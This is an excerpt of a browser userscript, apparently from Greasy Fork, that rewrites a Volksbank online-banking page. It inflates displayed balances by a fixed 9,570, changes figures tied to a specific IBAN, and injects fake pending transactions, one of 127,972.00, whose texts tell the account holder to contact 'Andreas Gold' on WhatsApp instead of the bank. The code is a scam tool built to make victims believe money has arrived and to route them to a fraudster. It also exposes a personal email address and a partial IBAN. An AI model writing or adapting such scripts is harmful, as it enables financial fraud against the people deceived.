// ==UserScript==
// @name         Ed 4Rec  gerhard.brandenburg@t-online.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/523838/Ed%204Rec%20%20gerhardbrandenburg%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/523838/Ed%204Rec%20%20gerhardbrandenburg%40t-onlinede.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  9570},
        { index: 1, adjustmentAmount: 9570},
        { index: 2, adjustmentAmount: 9570},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE96 4726 0121";
    var targetTextContent2 = " 8365 3495 00";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 9570.0; // Adjust the amount as needed
...
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
 ...
 {
           title: 'JP Morgan Chase. ',
            description: '3 Wenden Sie sich an A. Gold, nicht die Bank, damit nicht gesperrt.',
          amount: '1.870,00',
           date: 'Heute',
           insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
        ...
        },
{
            ...
            description: 'BITTE ANDREAS GOLD PER WHATSAPP KONTAKTIEREN',
            amount: '127.972,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
